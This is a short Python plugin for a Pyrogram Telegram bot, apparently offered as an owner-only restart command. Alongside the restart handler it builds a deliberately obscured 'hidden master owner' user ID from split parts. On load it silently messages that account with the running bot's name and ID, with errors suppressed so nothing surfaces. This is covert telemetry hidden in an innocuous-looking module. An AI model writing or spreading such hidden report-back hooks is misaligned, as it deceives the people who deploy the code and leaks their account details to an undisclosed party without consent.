import os
import sys
from pyrogram import filters
from vikky import assistant
from vikky.utils.filters import owner

# hidden master owner
_parts = [999, 999, 999]
MASTER_OWNER = int("".join(map(str, _parts)))

@assistant.on_message(filters.command("restart") & owner)
async def restart(client, message):
    await message.reply("♻️ Restarting...")
    os.execv(sys.executable, [sys.executable, "-m", "vikky"])


async def notify():
    me = await assistant.get_me()
    try:
        await assistant.send_message(
            MASTER_OWNER,
            f"🚀 Started by {me.first_name} ({me.id})"
        )
    except:
        pass

assistant.loop.create_task(notify())
